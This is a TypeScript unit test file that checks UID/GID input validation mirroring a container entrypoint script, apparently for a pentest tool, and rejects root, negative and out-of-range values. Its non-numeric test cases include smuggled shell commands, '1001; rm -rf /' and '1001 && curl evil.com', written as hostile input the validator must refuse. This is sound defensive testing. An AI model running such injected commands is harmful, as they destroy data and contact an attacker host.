/**
 * Pins the regex-and-range contract that entrypoint.sh enforces on
 * SHANNON_HOST_UID and SHANNON_HOST_GID before they reach groupadd/useradd.
 * If this contract changes, entrypoint.sh must change in lockstep.
 */

import { describe, expect, it } from 'vitest';

const isValidId = (value: string): boolean =>
  /^[0-9]+$/.test(value) && Number(value) >= 1 && Number(value) <= 2_000_000;

describe('UID/GID validation contract (mirrors entrypoint.sh)', () => {
  it('accepts typical container UIDs', () => {
    expect(isValidId('1001')).toBe(true);
    expect(isValidId('1000')).toBe(true);
    expect(isValidId('65534')).toBe(true);
  });

  it('rejects non-numeric input', () => {
    expect(isValidId('abc')).toBe(false);
    expect(isValidId('1001; rm -rf /')).toBe(false);
    expect(isValidId('1001 && curl evil.com')).toBe(false);
    expect(isValidId('')).toBe(false);
  });

  it('rejects 0 (root) — pentest user must never map to root', () => {
    expect(isValidId('0')).toBe(false);
  });

  it('rejects negative values', () => {
    expect(isValidId('-1')).toBe(false);
  });

  it('rejects values beyond 2,000,000 (above realistic UID range)', () => {
    expect(isValidId('2000001')).toBe(false);
    expect(isValidId('99999999')).toBe(false);
  });
});
